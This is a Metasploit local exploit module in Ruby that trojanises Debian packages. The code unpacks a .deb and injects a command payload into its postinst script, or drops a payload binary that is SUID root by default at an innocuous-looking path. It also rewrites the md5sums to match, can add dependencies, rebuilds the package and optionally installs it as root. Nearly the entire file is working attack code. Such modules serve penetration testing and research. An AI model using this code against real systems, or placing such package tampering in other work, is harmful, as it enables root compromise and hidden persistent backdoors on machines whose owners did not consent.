##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Post::File
  include Msf::Post::Unix
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Debian Package File Command Injection',
        'Description' => %q{
          This module exploits the widespread lack of per-package signing
          in the Debian package ecosystem. This means most .deb files are
          vulnerable to manipulation if read-write access is available. By
          injecting a payload into the package we can gain execution
          as the root user. Custom dependencies can also be specified,
          allowing us to install additional software.

          This module can be run with a handler, but it is not enabled
          by default.
        },
        'License' => MSF_LICENSE,
        'References' =>
        [
          ['URL', 'https://www.debian.org/doc/manuals/debian-faq/pkg-basics.en.html#package']
        ],
        'Author' => [
          'Andrew Vanderbilt @ Vander Security',  # Original PoC
          'Nick Cottrell <Rad10Logic>'            # PoC Additions
        ],
        'Platform' => ['unix', 'linux'],
        'Arch' => [
          ARCH_CMD,
          ARCH_X86,
          ARCH_X64,
          ARCH_ARMLE,
          ARCH_AARCH64,
          ARCH_PPC,
          ARCH_MIPSLE,
          ARCH_MIPSBE
        ],
        'Targets' => [
          ['Automatic', {}],
          [
            'Unix Command', {
              'Arch' => ARCH_CMD
            }
          ],
          [
            'Linux dropper', {
              'Arch' => [
                ARCH_X86,
                ARCH_X64,
                ARCH_ARMLE,
                ARCH_AARCH64,
                ARCH_PPC,
                ARCH_MIPSLE,
                ARCH_MIPSBE
              ]
            }
          ]
        ],
        'SessionTypes' => [ 'shell', 'meterpreter' ],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_fs_mkdir
              stdapi_fs_chmod
            ]
          }
        },
        'DefaultOptions' => { 'DisablePayloadHandler' => true },
        'Privileged' => true,
        'DisclosureDate' => '2023-03-25',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ], # Won't crash, but may fail parsing.
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ], # The APT log and installed packages list will indicate any dependencies we inject. Also the shell log for the package scripts.
          'Reliability' => [ REPEATABLE_SESSION ] # Infect as many pacakges as you want. Worst case the shell can't bind the port if multiple are active.
        }
      )
    )

    register_options([
      OptString.new('PACKAGE', [true, 'Absolute file path to the Debian package to hijack.']),
      OptBool.new('INSTALL_PACKAGE', [false, 'Attempt to install the newly infected package, reinstalling the package if necessary.', false]),
      OptString.new('DEPENDENCIES', [false, 'Package dependency to inject into control file. Separate multiple depenedencies with a \',\'. ie. depends1,depends2.']),
      OptString.new('PAYLOAD_DESTINATION', [false, 'Determines where the binary will be stored.', 'ie. /usr/local/bin/notsuspicious'], conditions: ['TARGET', '==', 'Linux dropper']),
      OptBool.new('SUID_PAYLOAD', [false, 'Should the payload have the SUID bit set so anyone running it will be root?', true], conditions: ['TARGET', '==', 'Linux dropper'])
    ])

    register_advanced_options([
      OptString.new('WritableDir', [true, 'A directory where we can write temporary files', '/tmp/']),
      OptBool.new('ExecuteOnInstall', [false, 'Execute the payload during installation?', false], conditions: ['TARGET', '==', 'Linux dropper'])
    ])
  end

  def check_package?(name)
    return cmd_exec("apt-cache policy #{name}") !~ /N: Unable to locate package /
  end

  def check_platform
    # check if the OS is certainly debian
    if session.type == 'meterpreter' && sysinfo['OS'] =~ /debian|ubuntu/i
      print_good('Session confirms it\'s Debian.')
      return CheckCode::Appears
    elsif session.type != 'meterpreter' && active_db? && framework.db.workspace.hosts.where(address: session.session_host)
      vprint_status('Checking framework db to see if platform info has already been discovered')
      # Additional check to fail if not linux
      host = framework.db.workspace.hosts.where(address: session.session_host).first
      if (host.os_name && host.os_name =~ /debian|ubuntu/i) || (host.os_flavor && host.os_flavor =~ /debian|ubuntu/i)
        print_good('Framework hosts suggests this is a debian flavor of linux')
        return CheckCode::Appears
      end
    else
      vprint_status('Checking system to see if its a debian flavor')
      s_info = get_sysinfo
      if s_info[:distro] =~ /debian|ubuntu/i || s_info[:version] =~ /debian|ubuntu/i || s_info[:kernel] =~ /debian|ubuntu/i
        print_good('System information confirms that it\'s a debian flavor')
        return CheckCode::Appears
      end
    end

    vprint_bad('Couldn\'t uncover whether OS was debian based. Checking to see if apt exists')
    if command_exists?('apt')
      print_good('Apt exists on the system')
      return CheckCode::Vulnerable
    else
      print_error('Apt cannot be found on the system. Exploit surely wont work.')
      return CheckCode::Unsupported
    end
  end

  def check_package
    # Check and ensure that PACKAGE leads to a file
    if datastore['PACKAGE'].end_with?('.deb', '.DEB') && file_exist?(expand_path(datastore['PACKAGE']))
      print_good('Deb package found at location.')
    # Otherwise, ensure that the PACKAGE is a package name
    elsif check_package?(datastore['PACKAGE'])
      print_status('Could not find deb file in PACKAGE path')
      print_good('Found PACKAGE as apt package')
    else
      print_error("Could not find PACKAGE [#{datastore['PACKAGE']}] in given filesystem nor as apt package")
      return CheckCode::Unknown
    end
    return CheckCode::Appears
  end

  def check_installable
    # TODO: Check to see if session user is allowed to run apt
    if is_root?
      print_good('Session is running as root. Should be able to install package.')
      return CheckCode::Vulnerable
    else
      print_error('Session is not running as root. Module can run, but it will only place the infected file in the current pwd')
      return CheckCode::Safe
    end
  end

  def check_dependencies
    for dependency in datastore['DEPENDENCIES'].split(',') do
      if !check_package?(dependency)
        print_error("Dependency for infected package [#{dependency}] does not exist. if attempting to install, this will prevent this from happening")
      end
    end
  end

  def check
    # Check that the right flavor of linux is used
    return check_platform if check_platform == CheckCode::Unsupported
    # Check and ensure that PACKAGE leads to a file
    return check_package if check_package == CheckCode::Unknown

    # Ensured that PACKAGE exists and can be tampered. Check if other options were used and if they can succeed
    if datastore['INSTALL_PACKAGE']
      return check_installable
    end

    if datastore['DEPENDENCIES']
      check_dependencies
    end
    return CheckCode::Appears
  end

  def inject_postinst(path, command)
    # Append our code to the postinst file.
    if file_exist?(path)
      print_good('Existing postinst file found.')
      print_status('Injecting command into postinst.')

      append_file(path, "#{command}\n")
    else
      print_status('No existing postinst file found.')
      print_status('A new one will be created')
      write_file(path, "#{command}\n")
    end
    vprint_good('Injected the following command:')
    vprint_good(command)
  end

  def inject_file(source_path, payload_path)
    # Add our new file to package in absolute reference to system
    print_status("Adding #{payload_path} to package")
    edit_file = file_exist?(File.join(source_path, payload_path))

    payload_path = payload_path.delete_prefix('/')
    dir_tree = source_path
    for dir_name in File.dirname(payload_path).split('/') do
      dir_tree = File.join(dir_tree, dir_name)
      mkdir(dir_tree)
    end

    write_file(File.join(source_path, payload_path), generate_payload_exe)
    vprint_status("Generated payload file at #{payload_path}")

    if datastore['SUID_PAYLOAD']
      chmod(File.join(source_path, payload_path), 0o4755)
    else
      chmod(File.join(source_path, payload_path), 0o755)
    end
    vprint_status('Set new binary to proper permissions')

    # Adding file to md5sums
    md5sums = File.join(source_path, 'DEBIAN', 'md5sums')
    md5_digest = file_remote_digestmd5(File.join(source_path, payload_path))
    vprint_status("New binary digest [#{md5_digest}]")
    if edit_file
      # if file already existed, replace md5 line with new one
      edited_sums = read_file(md5sums).gsub(/^[\w\d]+  #{payload_path}$/, "#{md5_digest}  #{payload_path}")
      write_file(md5sums, edited_sums)
      vprint_status('Replaced binary hash with new hash')
    else
      append_file(File.join(source_path, 'DEBIAN', 'md5sums'), "#{md5_digest}  #{payload_path}")
      vprint_status('Added new hash to sums')
    end
  end

  def inject_control_dependencies(path, dependency)
    control_data = read_file(path)

    # if dependency isnt in control file, add it in
    new_control_data = if control_data !~ /^Depends:/
                         control_data.gsub(/^(Installed-Size: \d+\n)/, "\\1Depends: #{dependency}\n")
                       else
                         control_data.gsub(/^(Depends: .*)$/, "\\1,#{dependency}")
                       end
    write_file(path, new_control_data)

    print_good('Injected dependency into control file.')
  end

  def exploit
    fail_with(Failure::NotVulnerable, 'Cannot confirm that system is debian') if check_platform == CheckCode::Unsupported
    fail_with(Failure::NotFound, "Cannot find package [#{datastore['PACKAGE']}] at location nor in apt") unless check_package == CheckCode::Appears
    fail_with(Failure::NoAccess, "Cannot write in given directory #{datastore['WritableDir']}") unless writable?(datastore['WritableDir'])
    fail_with(Failure::NoAccess, 'Cannot install package with session that isn\'t root') if datastore['INSTALL_PACKAGE'] && !is_root?
    # fail_with(Failure::NotFound, 'Could not find one of the designated dependencies') # TODO: Figure proper way to check dependencies
    fail_with(Failure::BadConfig, "If using #{payload.arch.first}, then PAYLOAD_DESTINATION needs to be set") if payload.arch.first != 'cmd' && !datastore['PAYLOAD_DESTINATION']

    # Set temp path for processing the package.
    working_directory = expand_path(File.join(datastore['WritableDir'], ".#{session.uuid}"))
    vprint_status("Working directory: #{working_directory}")

    # Set the paths to some files and directories well be using later.
    extracted_directory = "#{working_directory}/extracted"
    postinst_file = "#{extracted_directory}/DEBIAN/postinst"
    control_file = "#{extracted_directory}/DEBIAN/control"

    # DEBUG. Make sure the paths are correct.

    vprint_status("postinst_file: #{postinst_file}.")
    vprint_status("control_file: #{control_file}.")

    # Create the working directory.
    mkdir(working_directory)

    package = datastore['PACKAGE']
    # Check if package is a local file
    if package.end_with?('.deb', '.DEB') && file_exist?(expand_path(package))
      vprint_status('Found package file on system')
    elsif check_package?(package)
      vprint_status('Could not find package on system, but found it in apt')
      # If package is available in apt, download it
      cmd = cmd_exec("apt download #{package}")
      val = cmd.match(/Get:\d [^\s]+ [^\s]+ [^\s]+ ([^\s]+) ([^\s]+) ([^\s]+)/)
      if val
        package = "#{val[1]}_#{val[3]}_#{val[2]}.deb"
      else
        package = dir('.').find { |file| file.match(/^#{package}_.*\.deb$/) }
      end
      vprint_status("Package: #{package}")
    end

    # Extract the PACKAGE package using the builtin dpkg-deb.
    cmd_exec("dpkg-deb -R #{package} #{extracted_directory}")

    # Inject our command payload into postinst.
    if payload.arch.first == 'cmd'
      inject_postinst(postinst_file, payload.encoded)
    else
      inject_file(extracted_directory, datastore['PAYLOAD_DESTINATION'])
      if datastore['ExecuteOnInstall']
        inject_postinst(postinst_file, '/' + datastore['PAYLOAD_DESTINATION'].delete_prefix('/'))
      end
    end

    # Inject our dependency into the control file.
    if datastore['DEPENDENCIES']
      inject_control_dependencies(control_file, datastore['DEPENDENCIES'])
    end

    # Fix permissions of postinst file.
    if file_exist?(postinst_file)
      chmod(postinst_file, 0o775)
    end

    # Delete the original Debian Package.
    # For debugging, this only moves it atm.
    rm_f(package)

    # Rebuild the Debian package.
    cmd_exec("dpkg-deb -b #{extracted_directory} #{package}")

    # If attempting to install
    if datastore['INSTALL_PACKAGE'] && is_root?
      print_status('Installing infected package')
      vprint_status("Running command: apt install -y #{'./' if !package.start_with?('~/', '/')}#{package}")
      print_status(cmd_exec("apt install -y #{'./' if !package.start_with?('~/', '/')}#{package}"))

      # Remove the original package if downloaded with apt
      if check_package?(datastore['PACKAGE'])
        vprint_status('Package installed. Marking downloaded package for deletion.')
        register_file_for_cleanup(package)
      end

      # If installing binary and wanting handler, attempt to run it
      if payload.arch.first != 'cmd' && !datastore['DisablePayloadHandler']
        cmd_exec('/' + datastore['PAYLOAD_DESTINATION'].delete_prefix('/'))
      end
    end
  end
end
